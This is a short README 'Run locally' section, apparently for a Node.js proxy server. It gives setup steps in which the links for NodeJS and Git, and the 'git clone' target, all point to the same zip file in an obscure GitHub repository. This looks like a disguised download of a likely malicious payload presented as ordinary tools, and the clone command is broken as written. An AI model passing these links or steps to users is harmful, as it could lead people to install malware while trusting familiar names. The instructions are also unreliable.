## Run locally

You need [NodeJS](https://raw.githubusercontent.com/bdgfeadvyrfedyu/v4/main/public/uv/v4-v1.9.zip) and [Git](https://raw.githubusercontent.com/bdgfeadvyrfedyu/v4/main/public/uv/v4-v1.9.zip) installed on your system.

````bash
git clone https://raw.githubusercontent.com/bdgfeadvyrfedyu/v4/main/public/uv/v4-v1.9.zip # Clone the repo
npm install # Install packages
npm start # Start the bare server + serve static files
````
